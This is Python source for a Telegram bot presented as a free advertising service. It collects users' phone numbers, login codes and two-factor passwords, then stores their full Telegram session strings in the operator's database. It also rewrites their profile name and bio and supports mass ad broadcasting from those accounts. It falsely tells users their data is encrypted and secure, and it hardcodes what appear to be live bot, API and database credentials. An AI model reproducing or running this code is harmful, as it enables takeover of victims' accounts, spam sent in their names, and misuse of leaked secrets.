import asyncio
import logging
import re
import sys
from datetime import datetime, timezone
from typing import Dict, Optional
from dataclasses import dataclass

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from telegram.constants import ParseMode
from telegram.error import BadRequest

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
)

from motor.motor_asyncio import AsyncIOMotorClient

# Configuration
BOT_TOKEN = '8463982454:AAErd8EZswKgQ1BNF_r-N8iUH8HQcb293lQ'
API_ID = 22657083
API_HASH = 'd6186691704bd901bdab275ceaab88f3'
MONGO_URI = "mongodb+srv://bot627668:2bEJ56yJSu7vzLws@cluster0.qbw5van.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
DB_NAME = "adimyze"

PROFILE_NAME = "Adimyze Pro"
PROFILE_BIO = "🚀 Professional Telegram Marketing Automation | Managed by @nexaxoders"

logging.basicConfig(
    format='%(asctime)s | %(levelname)s | %(message)s',
    level=logging.INFO,
    handlers=[logging.FileHandler("bot.log"), logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client[DB_NAME]

@dataclass
class UserState:
    step: str = "idle"
    phone: str = ""
    phone_code_hash: str = ""
    client: Optional[TelegramClient] = None
    buffer: str = ""
    delay: int = 300

user_states: Dict[int, UserState] = {}

# --- Keyboards (Original Design) ---

def kb_start() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("     Dashboard       ", callback_data="nav|dashboard")],
        [InlineKeyboardButton("Updates", url="https://t.me/testttxs"),
         InlineKeyboardButton("Support", url="https://t.me/nexaxoders")],
        [InlineKeyboardButton("     How to Use      ", callback_data="nav|howto")],
        [InlineKeyboardButton("       Powered By    ", url="https://t.me/nexaxoders")]
    ])

def kb_dashboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Add Accounts", callback_data="account|add"),
         InlineKeyboardButton("My Accounts", callback_data="account|list")],
        [InlineKeyboardButton("Set Ad Message", callback_data="ad|set"),
         InlineKeyboardButton("Set Time Interval", callback_data="delay|set")],
        [InlineKeyboardButton("Start Ads", callback_data="campaign|start"),
         InlineKeyboardButton("Stop Ads", callback_data="campaign|stop")],
        [InlineKeyboardButton("Delete Accounts", callback_data="account|delete"),
         InlineKeyboardButton("Analytics", callback_data="analytics|main")],
        [InlineKeyboardButton("Auto Reply", callback_data="feature|autoreply")],
        [InlineKeyboardButton("Back", callback_data="nav|start")]
    ])

def kb_back(target: str = "nav|dashboard") -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton("Back", callback_data=target)]])

def kb_otp(user_id: int) -> InlineKeyboardMarkup:
    state = user_states.get(user_id, UserState())
    display = (state.buffer + "●" * (5 - len(state.buffer)))[:5]
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(display, callback_data="noop")],
        [InlineKeyboardButton("1", callback_data="otp|1"), InlineKeyboardButton("2", callback_data="otp|2"), InlineKeyboardButton("3", callback_data="otp|3")],
        [InlineKeyboardButton("4", callback_data="otp|4"), InlineKeyboardButton("5", callback_data="otp|5"), InlineKeyboardButton("6", callback_data="otp|6")],
        [InlineKeyboardButton("7", callback_data="otp|7"), InlineKeyboardButton("8", callback_data="otp|8"), InlineKeyboardButton("9", callback_data="otp|9")],
        [InlineKeyboardButton("⌫", callback_data="otp|back"), InlineKeyboardButton("0", callback_data="otp|0"), InlineKeyboardButton("✅", callback_data="otp|submit")],
        [InlineKeyboardButton("Show Code", callback_data="otp|show")],
        [InlineKeyboardButton("Back", callback_data="nav|dashboard")]
    ])

def kb_delay_presets() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("5min 🔴", callback_data="delay|300"),
         InlineKeyboardButton("10min 🟡", callback_data="delay|600"),
         InlineKeyboardButton("20min 🟢", callback_data="delay|1200")],
        [InlineKeyboardButton("Back", callback_data="nav|dashboard")]
    ])

def kb_analytics_detailed() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Detailed Report", callback_data="analytics|detailed")],
        [InlineKeyboardButton("Back", callback_data="nav|dashboard")]
    ])

# --- Content ---
WELCOME_TEXT = "╰_╯ Welcome to @Tecxo Free Ads bot — The Future of Telegram Automation\n\n• Premium Ad Broadcasting\n• Smart Delays\n• Multi-Account Support\n\nFor support contact: @NexaCoders"
ADD_ACCOUNT_PROMPT = "╰_╯HOST NEW ACCOUNT\n\nSecure Account Hosting\n\nEnter your phone number with country code:\nExample: +1234567890\n\nYour data is encrypted and secure"
OTP_INPUT = "Open inline keyboard\nTo enter otp"
TWO_FA_PROMPT = "🔐 2FA Detected!\n\nPlease send your Telegram cloud password:"

# --- Core Logic ---

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    photo_url = "https://telegra.ph/file/8a7f7e5c1a3b4e9d8f0a1.jpg"
    try:
        await update.message.reply_photo(photo_url, caption=WELCOME_TEXT, reply_markup=kb_start())
    except Exception:
        target = update.message or update.callback_query.message
        await target.reply_text(WELCOME_TEXT, reply_markup=kb_start())

async def handle_nav(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    target = query.data.split("|")[1]
    if target == "start": await cmd_start(update, context)
    elif target == "dashboard": await query.edit_message_text("Dashboard:", reply_markup=kb_dashboard())

async def handle_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    action = query.data.split("|")[1]
    user_id = query.from_user.id
    if action == "add":
        user_states[user_id] = UserState(step="phone")
        await query.edit_message_text(ADD_ACCOUNT_PROMPT, reply_markup=kb_back("nav|dashboard"))

async def message_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    state = user_states.get(user_id)
    if not state: return
    
    text = update.message.text

    if state.step == "phone":
        raw = re.sub(r"\D", "", text)
        phone = "+" + raw
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            sent = await client.send_code_request(phone)
            state.client, state.phone, state.phone_code_hash = client, phone, sent.phone_code_hash
            state.step = "code"
            await update.message.reply_text(f"⏳ Verification code sent to {phone}\n{OTP_INPUT}", reply_markup=kb_otp(user_id))
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {e}")

    elif state.step == "set_ad":
        await db.ads.update_one({"user_id": str(user_id)}, {"$set": {"text": text}}, upsert=True)
        state.step = "idle"
        await update.message.reply_text("✅ Ad message saved!", reply_markup=kb_dashboard())

    elif state.step == "password":
        await finalize_login(user_id, context, password=text)

async def handle_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    state = user_states.get(user_id)
    if not state or state.step != "code": return
    
    action = query.data.split("|")[1]
    if action == "back": state.buffer = state.buffer[:-1]
    elif action == "submit": await finalize_login(user_id, context)
    elif action.isdigit() and len(state.buffer) < 5: state.buffer += action

    try:
        await query.edit_message_reply_markup(reply_markup=kb_otp(user_id))
    except BadRequest: pass

async def finalize_login(user_id, context, password=None):
    state = user_states.get(user_id)
    try:
        if not password:
            await state.client.sign_in(state.phone, state.buffer, phone_code_hash=state.phone_code_hash)
        else:
            await state.client.sign_in(password=password)
        
        session = state.client.session.save()
        await state.client(UpdateProfileRequest(first_name=PROFILE_NAME, about=PROFILE_BIO))
        await db.accounts.update_one({"user_id": user_id, "phone": state.phone}, {"$set": {"session": session, "active": True}}, upsert=True)
        state.step = "idle"
        await context.bot.send_message(user_id, "✅ Account successfully added!", reply_markup=kb_dashboard())
    except SessionPasswordNeededError:
        state.step = "password"
        await context.bot.send_message(user_id, TWO_FA_PROMPT)
    except Exception as e:
        await context.bot.send_message(user_id, f"❌ Failed: {e}")

async def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CallbackQueryHandler(handle_nav, pattern=r"^nav\|"))
    app.add_handler(CallbackQueryHandler(handle_account, pattern=r"^account\|"))
    app.add_handler(CallbackQueryHandler(handle_otp, pattern=r"^otp\|"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_router))
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling(drop_pending_updates=True)
    logger.info("✅ Bot is running!")
    await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())